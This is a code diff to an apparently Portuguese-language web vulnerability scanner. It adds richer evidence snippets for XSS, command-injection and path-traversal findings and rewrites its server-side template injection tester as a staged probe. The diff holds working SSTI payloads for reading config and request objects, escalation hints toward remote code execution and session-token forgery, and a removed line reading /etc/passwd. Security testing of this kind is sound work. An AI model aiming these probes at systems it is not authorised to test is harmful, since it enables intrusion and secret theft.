@@ -305,6 +305,8 @@ async def test_xss(
                     None, lambda u=injected_url: session.get(u, timeout=10)
                 )
                 if payload in resp.text:
+                    idx = resp.text.find(payload)
+                    snippet = resp.text[max(0, idx - 60):idx + len(payload) + 60].strip()
                     findings.append({
                         "type": "XSS",
                         "subtype": f"reflected ({payload_info['type']})",
@@ -312,7 +314,13 @@ async def test_xss(
                         "param": param_name,
                         "method": "GET",
                         "payload": payload,
-                        "evidence": f"Payload refletido sem sanitização no HTML de resposta",
+                        "evidence": (
+                            f"Endpoint: `{injected_url}`\n"
+                            f"Parâmetro: `{param_name}`\n"
+                            f"Payload enviado: `{payload}`\n"
+                            f"Trecho da resposta HTML onde o payload foi refletido:\n"
+                            f"```\n...{snippet}...\n```"
+                        ),
                         "url": injected_url,
                         "attack_scenario": (
                             "Um atacante pode criar um link malicioso com o payload XSS embutido "
@@ -348,6 +356,8 @@ async def test_xss(
                             None, lambda: session.post(form_url, data=post_data, timeout=10)
                         )
                         if payload in resp.text:
+                            idx = resp.text.find(payload)
+                            snippet = resp.text[max(0, idx - 60):idx + len(payload) + 60].strip()
                             findings.append({
                                 "type": "XSS",
                                 "subtype": f"reflected POST ({payload_info['type']})",
@@ -355,7 +365,13 @@ async def test_xss(
                                 "param": fname,
                                 "method": "POST",
                                 "payload": payload,
-                                "evidence": f"Payload XSS refletido em `{form_url}`",
+                                "evidence": (
+                                    f"Endpoint (POST): `{form_url}`\n"
+                                    f"Parâmetro do formulário: `{fname}`\n"
+                                    f"Payload enviado: `{payload}`\n"
+                                    f"Trecho da resposta HTML onde o payload foi refletido:\n"
+                                    f"```\n...{snippet}...\n```"
+                                ),
                                 "url": form_url,
                                 "attack_scenario": (
                                     "Formulários que refletem input do usuário sem sanitização "
@@ -376,51 +392,196 @@ async def test_xss(
 # SSTI Tester
 # ---------------------------------------------------------------------------
 
-async def test_ssti(
-    url: str,
-    params: dict[str, str] | None = None,
-) -> list[dict[str, Any]]:
-    """Testa Server-Side Template Injection em parâmetros GET."""
-    findings: list[dict[str, Any]] = []
+async def test_ssti(url, params=None):
+    findings = []
     session = _build_session()
     loop = asyncio.get_event_loop()
-
     target_params = params or _extract_params_from_url(url)
+
     for param_name in target_params:
-        for payload_info in SSTI_PAYLOADS:
-            payload = payload_info["payload"]
-            expected = payload_info["expected"]
-            engine = payload_info["engine"]
-            injected_url = _inject_param(url, param_name, payload)
+        # ── ETAPA 1: sinal matemático ──────────────────────────────
+        # Envia {{7*7}}, verifica se "49" aparece de forma isolada
+        # (não como parte de "149", "490", "2049" etc.)
+        stage1_hits = []
+        for p in [{"payload": "{{7*7}}", "expected": r"\b49\b", "engine": "Jinja2/Twig"},
+                  {"payload": "${7*7}",  "expected": r"\b49\b", "engine": "FreeMarker/Mako"},
+                  {"payload": "<%= 7*7 %>", "expected": r"\b49\b", "engine": "ERB/EJS"}]:
+            injected = _inject_param(url, param_name, p["payload"])
             try:
-                resp = await loop.run_in_executor(
-                    None, lambda u=injected_url: session.get(u, timeout=10)
-                )
-                if expected.lower() in resp.text.lower() and payload not in resp.text:
-                    findings.append({
-                        "type": "SSTI",
-                        "subtype": f"confirmed ({engine})",
-                        "severity": "CRITICAL",
-                        "param": param_name,
-                        "method": "GET",
-                        "payload": payload,
-                        "evidence": f"O template engine processou `{payload}` e retornou `{expected}`",
-                        "url": injected_url,
-                        "attack_scenario": (
-                            f"O servidor utiliza {engine} e avalia expressões injetadas. "
-                            "Um atacante pode escalar de SSTI para Remote Code Execution (RCE) "
-                            "completo no servidor, executando comandos arbitrários como "
-                            "`os.popen('cat /etc/passwd').read()` ou extraindo variáveis de "
-                            "ambiente com credenciais de banco de dados e API keys."
-                        ),
-                    })
+                resp = await loop.run_in_executor(None, lambda u=injected: session.get(u, timeout=10))
+                # Verifica \b49\b (word boundary) E que o payload não está refletido raw
+                if re.search(p["expected"], resp.text) and p["payload"] not in resp.text:
+                    # Captura contexto ao redor do "49" para evidência
+                    match = re.search(r'.{0,30}\b49\b.{0,30}', resp.text)
+                    context = match.group(0).strip() if match else "49"
+                    stage1_hits.append({**p, "context": context, "url": injected})
+            except Exception:
+                continue
+
+        if not stage1_hits:
+            continue  # Sem sinal matemático, vai pro próximo parâmetro
+
+        # ── ETAPA 1.5: controle de string ──────────────────────────
+        # Envia {{"abc"}} — se retornar "abc" (sem as chaves), o template
+        # está interpretando strings, não apenas refletindo input.
+        # Isso distingue template execution de simples reflection.
+        string_control_ok = False
+        for hit in stage1_hits:
+            sc_payload = '{{"abc"}}'
+            sc_url = _inject_param(url, param_name, sc_payload)
+            try:
+                resp_sc = await loop.run_in_executor(None, lambda u=sc_url: session.get(u, timeout=10))
+                # "abc" aparece mas o payload raw não foi refletido inteiro
+                if "abc" in resp_sc.text and sc_payload not in resp_sc.text:
+                    string_control_ok = True
                     break
             except Exception:
                 continue
 
+        # ── ETAPA 1.6: syntax break ────────────────────────────────
+        # Envia {{7*}} — sintaxe inválida para a maioria das engines.
+        # Se o servidor retornar um erro de template → engine está ativa e avaliando.
+        # Padrões de erro de template engines conhecidas:
+        TEMPLATE_ERROR_PATTERNS = [
+            r"TemplateSyntaxError", r"TemplateError", r"jinja2",
+            r"UndefinedError", r"syntax error in template",
+            r"unexpected end of template", r"unexpected '\}'",
+            r"TemplateSyntaxException", r"freemarker\.template",
+            r"org\.thymeleaf", r"Twig_Error", r"SyntaxError.*template",
+            r"template rendering", r"render error",
+        ]
+        syntax_error_ok = False
+        for hit in stage1_hits:
+            sb_payload = "{{7*}}"
+            sb_url = _inject_param(url, param_name, sb_payload)
+            try:
+                resp_sb = await loop.run_in_executor(None, lambda u=sb_url: session.get(u, timeout=10))
+                if any(re.search(pat, resp_sb.text, re.IGNORECASE) for pat in TEMPLATE_ERROR_PATTERNS):
+                    syntax_error_ok = True
+                    break
+            except Exception:
+                continue
+
+        # ── ETAPA 2: diferenciação de engine ───────────────────────
+        # {{7*'7'}} → Jinja2 retorna '7777777', Twig retorna 49
+        confirmed_engine = None
+        for hit in stage1_hits:
+            diff_payload = "{{7*'7'}}"
+            diff_url = _inject_param(url, param_name, diff_payload)
+            try:
+                resp2 = await loop.run_in_executor(None, lambda u=diff_url: session.get(u, timeout=10))
+                if "7777777" in resp2.text and diff_payload not in resp2.text:
+                    confirmed_engine = "Jinja2 (confirmado)"
+                    break
+                elif re.search(r'\b49\b', resp2.text) and diff_payload not in resp2.text:
+                    confirmed_engine = f"{hit['engine']} (provável)"
+            except Exception:
+                continue
+
+        # Calcula confiança baseada em quantas etapas passaram
+        confidence_score = sum([
+            bool(stage1_hits),      # sinal matemático
+            string_control_ok,      # controle de string
+            syntax_error_ok,        # syntax break
+            bool(confirmed_engine), # engine diferenciada
+        ])
+
+        if confidence_score <= 1:
+            # Apenas sinal matemático → INDÍCIO, não reportar como finding real
+            # (pode ser coincidência ou reflexão simples)
+            continue
+
+        if not confirmed_engine:
+            # Stage 1 + pelo menos 1 validação adicional → PROVÁVEL
+            confidence_label = "PROVÁVEL" if (string_control_ok or syntax_error_ok) else "INDÍCIO"
+            evidence_lines = [
+                f"Etapa 1 — Sinal matemático: payload `{stage1_hits[0]['payload']}` → contexto: `...{stage1_hits[0]['context']}...`",
+                f"Etapa 1.5 — Controle de string ({{'\"abc\"'}}): {'✅ retornou \"abc\" sem refletir o payload raw' if string_control_ok else '❌ inconclusivo'}",
+                f"Etapa 1.6 — Syntax break ({{'7*'}}): {'✅ erro de template detectado na resposta' if syntax_error_ok else '❌ sem erro de template'}",
+                f"Etapa 2 — Diferenciação de engine: ❌ inconclusiva",
+                f"Confiança: {confidence_label}",
+            ]
+            findings.append({
+                "type": "SSTI",
+                "subtype": f"provável — engine não confirmada ({confidence_label})",
+                "severity": "MEDIUM",
+                "param": param_name,
+                "payload": stage1_hits[0]["payload"],
+                "evidence": "\n".join(evidence_lines),
+                "url": stage1_hits[0]["url"],
+                "attack_scenario": (
+                    f"SSTI {confidence_label}: sinal matemático + "
+                    f"{'controle de string ' if string_control_ok else ''}"
+                    f"{'syntax break ' if syntax_error_ok else ''}detectados. "
+                    "Requer validação manual com payloads de context access para confirmar impacto."
+                )
+            })
+            continue
+
+        # ── ETAPA 3: acesso a contexto / extração ─────────────────
+        # Só chega aqui se engine confirmada (Stage 2 passou).
+        # Testa self, config, request — se retornar dados internos → CRITICAL real.
+        rce_confirmed = False
+        rce_evidence = ""
+        context_payload_used = ""
+        extraction_payloads = [
+            {"payload": "{{config}}", "marker": r"Config|SECRET_KEY|DATABASE|DEBUG"},
+            {"payload": "{{self}}", "marker": r"TemplateReference|namespace|Jinja2"},
+            {"payload": "{{request}}", "marker": r"Request|environ|wsgi|HTTP_HOST"},
+            {"payload": "{{''.__class__.__mro__}}", "marker": r"object|type|class"},
+            {"payload": "{{request.environ}}", "marker": r"wsgi|SERVER_NAME|HTTP_HOST"},
+        ]
+        for ep in extraction_payloads:
+            ep_url = _inject_param(url, param_name, ep["payload"])
+            try:
+                resp3 = await loop.run_in_executor(None, lambda u=ep_url: session.get(u, timeout=10))
+                if re.search(ep["marker"], resp3.text, re.IGNORECASE) and ep["payload"] not in resp3.text:
+                    match = re.search(r'.{0,80}(' + ep["marker"] + r').{0,80}', resp3.text, re.IGNORECASE)
+                    rce_evidence = match.group(0).strip() if match else "objeto interno retornado"
+                    context_payload_used = ep["payload"]
+                    rce_confirmed = True
+                    break
+            except Exception:
+                continue
+
+        severity = "CRITICAL" if rce_confirmed else "HIGH"
+        evidence_lines = [
+            f"Etapa 1 — Sinal matemático: payload `{stage1_hits[0]['payload']}` → `...{stage1_hits[0]['context']}...`",
+            f"Etapa 1.5 — Controle de string: {'✅ `{{\"abc\"}}` retornou \"abc\" — execução de string confirmada' if string_control_ok else '❌ inconclusivo'}",
+            f"Etapa 1.6 — Syntax break: {'✅ erro de template detectado — engine avaliando expressões' if syntax_error_ok else '❌ sem erro de template'}",
+            f"Etapa 2 — Engine: {confirmed_engine}",
+        ]
+        if rce_confirmed:
+            evidence_lines.append(
+                f"Etapa 3 — Acesso a contexto: payload `{context_payload_used}` "
+                f"retornou dados internos: `...{rce_evidence}...`"
+            )
+            evidence_lines.append("Confiança: CONFIRMADO — execução server-side com acesso a objetos internos")
+        else:
+            evidence_lines.append("Etapa 3 — Acesso a contexto: ❌ payloads de extração inconclusivos")
+            evidence_lines.append("Confiança: PROVÁVEL — execução confirmada, impacto ainda não extraído")
+
+        findings.append({
+            "type": "SSTI",
+            "subtype": f"confirmed ({confirmed_engine})" + (" + context access" if rce_confirmed else ""),
+            "severity": severity,
+            "param": param_name,
+            "payload": stage1_hits[0]["payload"],
+            "evidence": "\n".join(evidence_lines),
+            "url": stage1_hits[0]["url"],
+            "attack_scenario": (
+                f"SSTI {'CRÍTICA' if rce_confirmed else 'provável'} em {confirmed_engine}. "
+                + (f"Acesso a objeto interno confirmado via `{context_payload_used}`. "
+                   "Escalável para RCE completo via `{{''.__class__.__mro__[1].__subclasses__()}}` "
+                   "ou leitura de SECRET_KEY para forjar tokens de sessão."
+                   if rce_confirmed else
+                   "Engine confirmada mas extração de contexto inconclusiva. "
+                   "Testar manualmente: `{{config}}`, `{{self}}`, `{{request.environ}}`.")
+            )
+        })
+
     session.close()
     return findings
-
 
 # ---------------------------------------------------------------------------
 # Command Injection Tester
@@ -446,6 +607,8 @@ async def test_cmdi(
                     None, lambda u=injected_url: session.get(u, timeout=10)
                 )
                 if re.search(marker, resp.text):
+                    match = re.search(r'.{0,40}(' + marker + r').{0,40}', resp.text)
+                    captured = match.group(0).strip() if match else "marker encontrado"
                     findings.append({
                         "type": "Command Injection",
                         "subtype": "OS command execution",
@@ -453,7 +616,12 @@ async def test_cmdi(
                         "param": param_name,
                         "method": "GET",
                         "payload": payload,
-                        "evidence": f"Output de comando do sistema detectado na resposta",
+                        "evidence": (
+                            f"Endpoint: `{injected_url}`\n"
+                            f"Parâmetro: `{param_name}`\n"
+                            f"Payload enviado: `{payload}`\n"
+                            f"Output do SO capturado na resposta: `...{captured}...`"
+                        ),
                         "url": injected_url,
                         "attack_scenario": (
                             "O atacante tem execução de comandos direta no sistema "
@@ -501,6 +669,8 @@ async def test_path_traversal(
                     None, lambda u=injected_url: session.get(u, timeout=10)
                 )
                 if re.search(marker, resp.text):
+                    file_match = re.search(r'.{0,20}(' + marker + r').{0,100}', resp.text)
+                    file_snippet = file_match.group(0).strip() if file_match else "conteúdo detectado"
                     findings.append({
                         "type": "Path Traversal / LFI",
                         "subtype": "local file read",
@@ -508,7 +678,13 @@ async def test_path_traversal(
                         "param": param_name,
                         "method": "GET",
                         "payload": payload,
-                        "evidence": f"Conteúdo de arquivo local sensível detectado na resposta",
+                        "evidence": (
+                            f"Endpoint: `{injected_url}`\n"
+                            f"Parâmetro: `{param_name}`\n"
+                            f"Payload enviado: `{payload}`\n"
+                            f"Conteúdo do arquivo lido na resposta:\n"
+                            f"```\n...{file_snippet}...\n```"
+                        ),
                         "url": injected_url,
                         "attack_scenario": (
                             "O atacante pode ler qualquer arquivo do servidor: "
